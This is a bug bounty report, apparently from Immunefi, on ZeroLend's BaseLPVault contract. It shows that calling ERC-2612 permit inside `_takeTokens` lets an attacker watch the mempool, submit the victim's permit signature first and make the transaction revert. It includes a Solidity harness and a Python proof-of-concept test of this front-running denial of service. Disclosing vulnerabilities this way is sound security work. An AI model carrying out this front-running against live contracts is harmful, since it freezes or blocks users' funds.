# 29249 - \[SC - Insight] Using permit inside the function can lead to Do...

Submitted on Mar 12th 2024 at 03:02:58 UTC by @stiglitz for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29249

Report type: Smart Contract

Report severity: Insight

Target: <https://github.com/zerolend/governance>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
* Permanent freezing of funds
* Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

The abstract contract `BaseLPVault` implements the function `_takeTokens`:

```solidity
function _takeTokens(uint256 amount, PermitData memory permit) internal {
    if (permit.deadline > 0) {
        IERC2612(address(zero)).permit(
            msg.sender,
            address(this),
            permit.value,
            permit.deadline,
            permit.v,
            permit.r,
            permit.s
        );
    }
    zero.transferFrom(msg.sender, address(this), amount);
}
```

The function is not used anywhere because the codebase is not fully and completely implemented. However, if this function is called with `permit.deadline > 0`, the call can be front-runned by an attacker calling the permit function directly and causing DoS.

## Vulnerability Details

`ERC2612::permit` function is a permissionless function. Front-running direct permit calls is not a problem because the action of the function will be the same no matter who is the `msg.sender`

The problem is when the `permit` function is used as a part of another function. In this scenario, an attacker can monitor the mempool and if he spots the call that will execute the functions which contain `permit` call, he will extract signature data and call the `permit` function directly.

Now, because the signature is already used, it will revert the original transaction, and the code following `.permit` call won't be executed.

## Impact Details

DoS, which can be temporary or longer lasting if there is no walk-around for the specicif execution flow. The severity also depends on the logic of the function that will call `BaseLPVault::_takeTokens`

## References

It is exactly the scenario described by Trust: <https://www.trust-security.xyz/post/permission-denied>

## Proof of Concept

### XVault is BaseLPVault

#### tests/XVault.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.20;

import {BaseLPVault} from "../contracts/locker/tokenized-pools/BaseLPVault.sol";
import {IWETH} from "../contracts/interfaces/IWETH.sol";

contract XVault is BaseLPVault {


    function takeTokens(uint256 amount, PermitData memory permit) external {
        _takeTokens(amount, permit);
        
    }

    // ----------------------------------------------------------------------------
    // Just to make it compile
    function _deposit(DepositParams calldata params) internal override
    returns (
        uint256 shares,
        uint128 addedLiquidity,
        uint256 amount0,
        uint256 amount1)
    {
        return (0, 0, 0, 0);
    }

    function _withdraw(WithdrawParams calldata params) internal override 
    returns (
        uint128 removedLiquidity,
        uint256 amount0,
        uint256 amount1)
    {
        return (0, 0, 0);
    }
    
    function stakeEth() external payable
    {
        return;
    }

    function stakeEthAndTokens(uint256 amount, PermitData memory permit) external payable
    {
        return;
    }

    function stakeTokens(uint256 amount, PermitData memory permit) external
    {
        return;
    }

    function totalSupplyLP() external returns (uint256)
    {
        return 0;
    }
    
    function balanceOfLP(address who) external returns (uint256)
    {
        return 0;
    }

    function claimFees() external returns (uint256)
    {
        return 0;
    }

}

```

### Test

#### tests/test\_permit.py

```python
from wake.testing import *
from dataclasses import dataclass

from pytypes.openzeppelin.contracts.proxy.ERC1967.ERC1967Proxy import ERC1967Proxy
from pytypes.contracts.vesting.earlyzero.EarlyZERO import EarlyZERO
from pytypes.contracts.interfaces.ILPVault import ILPVault
from pytypes.contracts.interfaces.IWETH import IWETH
from pytypes.tests.XVault import XVault




'''
Test written in Wake testing framework (https://getwake.io/) aka boosted brownie

Docs: 
https://ackeeblockchain.com/wake/docs/latest/

Repo:
https://github.com/Ackee-Blockchain/wake

How to run this test:

Install wake
    $ pip install eth-wake

To have actual anvil version
    $ foundryup

After installing project dependencies initialize wake
It will create `tests` folder and process foundry remappings if any
    $ wake up

Generate python representation of contracts
    $ wake init pytypes

Go to wake `tests` folder and paste this code in tests/test_permit.py and run
    $ wake test tests/test_permit.py

'''

@dataclass
class Permit:
    owner: Address
    spender: Address
    value: uint256
    nonce: uint256
    deadline: uint256


def deploy_with_proxy(contract):
    impl = contract.deploy()
    proxy = ERC1967Proxy.deploy(impl, b"")
    return contract(proxy)

# Print failing tx call trace
def revert_handler(e: TransactionRevertedError):
    if e.tx is not None:
        print(e.tx.call_trace)

@default_chain.connect()
@on_revert(revert_handler)
def test_permit():
    # ======================DEPLOY========================= #
    # USERS
    owner = default_chain.accounts[0]
    alice = default_chain.accounts[1] # Good
    bob   = default_chain.accounts[2] # Bad
    # Random addresses we dont need now
    treasury = default_chain.accounts[8]
    weth     = IWETH(default_chain.accounts[9])
    
    
    # Deploy mock token
    zero_token = EarlyZERO.deploy(from_=owner)
    # Send something to alice
    zero_token.transfer(alice, 100*10**18, from_=owner)
    # Disable whitelist and blacklist
    zero_token.toggleWhitelist(False, False, from_=owner)
    # Deploy XVault is BaseLPVault
    x_vault = deploy_with_proxy(XVault)
    x_vault.init(weth, zero_token, treasury, from_=owner)
    # Sign the permit data
    amount = 10*10**18
    permit = Permit(
        owner    = alice.address,
        spender  = x_vault.address,
        value    = amount,
        nonce    = zero_token.nonces(alice),
        deadline = default_chain.blocks["latest"].timestamp + 100_000
    )
    #typehash  = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)")
    print(default_chain.chain_id)
    print(zero_token.eip712Domain())
    signature = alice.sign_structured(permit,
                                      Eip712Domain(
                                            name="earlyZERO",
                                            version="1",
                                            chainId=default_chain.chain_id,
                                            verifyingContract=zero_token.address))
    
    permit_data = ILPVault.PermitData(value=permit.value,
                                      deadline=permit.deadline,
                                      v=signature[64], 
                                      r=signature[:32], 
                                      s=signature[32:64])
    

    # Bob frontrun takeTokens TX and extract permit
    # Because Bob used the specific signature `x_vault.takeTokens` will fail
   
    # Comment this section and TX takeTokens will pass
    # '''
    zero_token.permit(permit.owner, 
                      permit.spender, 
                      permit.value, 
                      permit.deadline, 
                      signature[64], 
                      signature[:32], 
                      signature[32:64], 
                      from_=bob)
    # '''

    tx = x_vault.takeTokens(amount, permit_data, from_=alice)
    print(tx.call_trace)
    assert zero_token.balanceOf(x_vault) == amount



```
